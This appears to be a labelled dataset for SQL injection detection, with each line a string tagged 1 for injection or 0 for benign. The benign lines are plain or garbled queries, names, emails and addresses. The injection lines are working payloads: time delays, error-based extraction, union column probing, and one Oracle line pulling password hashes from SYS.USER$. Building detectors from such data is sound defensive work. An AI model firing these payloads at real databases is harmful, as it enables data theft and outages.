1%'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  ';1
SELECT include, eaten, solidFROM die WHERE partly  IS NOT NULL;0
1%'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  ';1
zarraga;0
-8007'   )    )    as bgpp where 9555  =  9555 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --;1
"UPDATE employees SET price = 'pending' WHERE price = 'Sample text';";0
-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --;1
1%'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  ';1
SELECT * FROM sit WHERE teach = 'rock';0
select   (  case when   (  9732  =  7136  )   then 9732 else 9732*  (  select 9732 from information_schema.character_sets  )   end  )  #;1
dotty;0
SELECT new ( s )  FROM bark SELECT what FROM service;0
rivalee;0
-4885 union all select 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589#;1
,(select * from (select(sleep(10)))a);1
coderch gordo;0
SELECT * FROM shake ORDER BY jar DESC;0
4,54E+15;0
-1033 union all select 8731,8731,8731,8731,8731,8731--;1
1'   )    )    as iipj where 6560  =  6560;1
1'  )   and 7533  =  7533 and   (  'dbjq'  =  'dbjq;1
silvie;0
57757963h;0
"INSERT INTO inventory (description, name, price) VALUES ('user123', '2023-01-01', '2023-01-01');";0
1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'sxgl'  =  'sxgl;1
SELECT * FROM salmon  WHERE principal NOT LIKE '[his]%';0
SELECT TOP 3 * FROM roof SELECT * FROM hand 3SELECT * FROM sail;0
"SELECT id, description FROM products WHERE user_id = 'Sample text';";0
gwenda;0
1' and 1541  =  6868#;1
1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl;1
lozier;0
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg;1
1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --;1
1 where 3410  =  3410 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"1""  )   where 6903  =  6903";1
14970;0
"UPDATE orders SET id = '2023-01-01' WHERE description = 'active';";0
elwes@enla.nu;0
-8136'  )   union all select 1324,1324,1324,1324#;1
harvison;0
SELECT COUNT ( stringID ) FROM journey;0
88918773z;0
SELECT * FROM honor WHERE moment = 'wave' FETCH FIRST 3 ROWS ONLY;0
35936056m;0
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'foop' like 'foop;1
graciliano;0
callejon san felices 187;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#;1
1'||  (  select 'jscc' from dual where 3266  =  3266 and elt  (  4249  =  4249,7259   )    )   ||';1
SELECT * FROM south WHERE distance = 'temperature'  AND City = 'rope';0
SELECT * FROM car WHERE naturally = 'plane' LIMIT 3;0
select count  (  *  )   from generate_series  (  1,5000000  )   and 'fahy' like 'fahy;1
1'||  (  select 'rfjl' where 2476  =  2476 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   ||';1
SELECT column_name ( s )  FROM west,center;0
SELECT column_name ( s )  FROM vowel,softly;0
1   )    )    as rsnb where 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #;1
SELECT DISTINCT visit FROM creature;0
1%'  )   union all select null,null,null--;1
1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --;1
SELECT * FROM forth WHERE missing = 'outer';0
# from wapiti;1
47494;0
1  )   union all select null,null,null,null,null,null,null#;1
1'  )   as afnt where 4719  =  4719 and elt  (  8224  =  1275,1275  )  --;1
-1238'  )   as lxur where 7075  =  7075 union all select 7075,7075,7075,7075,7075,7075,7075,7075,7075,7075#;1
1',  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ;1
ostapchuk casal;0
broquel;0
7633;0
1 and make_set  (  9681  =  4703,4703  )  # zbrf;1
38355013y;0
rgiva;0
SELECT COUNT ( follow ) , grain FROM us BY pain;0
SELECT TOP 3 * FROM begun WHERE future = 'way';0
7,74E+15;0
-2028%'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  ';1
1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
SELECT Count ( * )  AS company;0
or 'text'   =   n'text';1
SELECT * FROM sudden FETCH FIRST 3 ROWS ONLY;0
saturin-fabre0@cienciapolicial.int;0
"INSERT INTO orders (user_id, status) VALUES (123, 123);";0
select * from users where id  =  1 +$ . union select null,@@VERSION -- 1;1
capers@innovaris.fr;0
SELECT * FROM factory WHERE team = 'should';0
SELECT bat ( s )  FROM sort UNION;0
SELECT MIN ( practice )  AS airplane FROM well;0
SELECT cover ( s )  FROM pay FULL OUTER JOIN;0
1'   )    )    as vnwn where 8774  =  8774 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #;1
"-7345%"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """;1
SELECT * FROM fall WHERE doctor NOT LIKE 'arrow%';0
SELECT * FROM flew WHERE flame NOT LIKE 'of%';0
SELECT * FROM frighten WHERE NOT figure = 'list'  AND NOT apart = 'heavy';0
"-7416"" where 7656  =  7656 order by 1--";1
jabbari;0
1' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ;1
18223647b;0
19115;0
-3582  )   where 5873  =  5873 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
"1%"" and make_set  (  8403  =  8403,8899  )   and ""%""  =  """;1
radunsky_oses@guejosgratis.cg;0
iif  (  7889  =  5114,1,1/0  )  ;1
SELECT dangerous,pretty FROM freedom WHERE loud = 'badly' UNION SELECT apartment, office FROM light;0
saleh;0
enrique;0
benchmark(50000000,MD5(1));1
1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --;1
25254382z;0
SELECT headed, statement+ ', ' + supply+ ' ' + because+ ', ' + whenever AS simple  FROM bottom;0
SELECT * FROM nest WHERE    NOT burst = 'source';0
1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929;1
SELECT entire ( s )  FROM completely LEFT JOIN;0
1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt;1
OR 3409=3409 AND ('pytW' LIKE 'pytY;1
/*…*/;1
SELECT * FROM his FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM needle;0
5urgui8a;0
"1%""   )    )    and 2006  =  2006";1
SELECT AVG ( poet ) FROM spin;0
1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
cardedeu 54;0
SELECT * FROM sudden WHERE pig = 'pile'  OR hand = 'mix';0
1%'   )    )    waitfor delay '0:0:5'--;1
"DELETE FROM users WHERE price = 123;";0
SELECT * FROM lunch FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM baseball;0
1%'   )    )     )   union all select null--;1
1'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'tvcm'  =  'tvcm;1
c/ montealegre s/n, 9-b;0
1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied;1
SELECT Employees.house, COUNT ( Orders.picturedID )  AS nationalFROM    ( OrdersINNER JOIN series ON Orders.deeplyID  =  Employees.positionID ) ;0
1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'nwdk' like 'nwdk;1
"-5161%"" or   (  1437  =  4869  )  *4869 and ""%""  =  """;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#;1
37210;0
password:*/  =  1--;1
cinthia;0
1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null#;1
mara beln;0
braa;0
SELECT * FROM facing ORDER BY putting DESC;0
1'+  (  select dyfw where 7743  =  7743 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +';1
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo";1
SELECT * FROM measure WHERE accurate IN  ( 'observe', 'suggest', 'current' )  ;0
merriell;0
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  1473  =  1473;1
SLEEP(5)--;1
palacios de riopisuerga;0
florian@alcantarapartners.so;0
"1"" where 6352  =  6352";1
1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ;1
dalmau;0
select   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  select 2774 from information_schema.character_sets  )   end  )  #;1
"DELETE FROM orders WHERE description = 'user123';";0
"SELECT description, status, created_at, user_id FROM orders WHERE price = 'active';";0
SELECT * FROM  ( SELECT western FROM plant ) ;0
1'   )    )    as fjbe where 4662  =  4662 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"-5227"" union all select 2666--";1
"1""   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dwcy""  =  ""dwcy";1
SELECT AVG ( merely ) FROM until SELECT SUM ( give ) ;0
-3632' or make_set  (  9354  =  9354,7185  )   and 'lgpy' like 'lgpy;1
%' AND 8310=8310 AND '%'=';1
1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ;1
"-7884"" where 3297  =  3297 or 2492  =  6158";1
SELECT * FROM riding WHERE    NOT work = 'known';0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--;1
"1""   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ugtw""  =  ""ugtw";1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#;1
FROM  ( SELECT DISTINCT wealth FROM black ) ;0
1'||  (  select 'hshf' where 9073  =  9073 and 7533  =  7533  )  ||';1
SELECT * FROM position FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search;0
select   (  case when   (  4935  =  4734  )   then 4935 else 4935*  (  select 4935 from mysql.db  )   end  )  #;1
c/ avi xaxu, 157,;0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk";1
SELECT * FROM specific  WHERE explore NOT LIKE '[cool]%';0
select   (  case when   (  9388  =  4322  )   then 1 else 9388*  (  select 9388 from master..sysdatabases  )   end  )  --;1
1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lfhx'  =  'lfhx;1
1%'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  '%'  =  ';1
SELECT * FROM bush WHERE five NOT LIKE 'bite%';0
clav6ria;0
or 'whatever' in   (  'whatever'  ) ;1
"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """;1
"UPDATE inventory SET email = 'pending' WHERE email = 123;";0
san lorenzo de la parrilla;0
wilmont;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i;1
grupo fuensanta 197, 12?a;0
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy";1
per8ebimie0to;0
SELECT will,suit,green FROM damage LEFT JOIN Orders ON rod.pineID =  outer.ask ORDER BY pipe.brought;0
"-7744""   )    )     )   union all select 9408,9408,9408,9408--";1
1%'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   '%'  =  ';1
-6145 or   (  8459  =  8459  )  *4906-- yklv;1
SELECT * FROM taken FETCH FIRST 50 PERCENT ROWS ONLY;0
1%'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   '%'  =  ';1
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl;1
gwillim.somerset@mystyleperfume.nl;0
to85lo372;0
SELECT * FROM today ORDER BY taught ASC, vast DESC;0
rolleck@soybueno.mm;0
SELECT AVG ( stop ) FROM crack SELECT SUM ( essential ) ;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23;1
-1280'   )    )    or 8571  =  8571--;1
"SELECT created_at, quantity, status, price FROM products WHERE user_id = 'user123';";0
1%'  )   union all select null,null,null,null,null,null--;1
SELECT * FROM  ( SELECT hollow FROM track ) ;0
1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh;1
1'||  (  select 'ylek' where 3803  =  3803 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||';1
SELECT * FROM party WHERE same NOT BETWEEN 'did' AND 'those';0
"UPDATE customers SET status = 'user123' WHERE quantity = 123;";0
-7858'  )   union all select 1541,1541,1541,1541,1541,1541#;1
sile;0
SELECT * FROM action WHERE happily = 'per';0
SELECT life FROM bar;0
SELECT * FROM thy;0
-1737' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fsmd'  =  'fsmd;1
calle florian de ocampo 114, 7?h;0
"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #";1
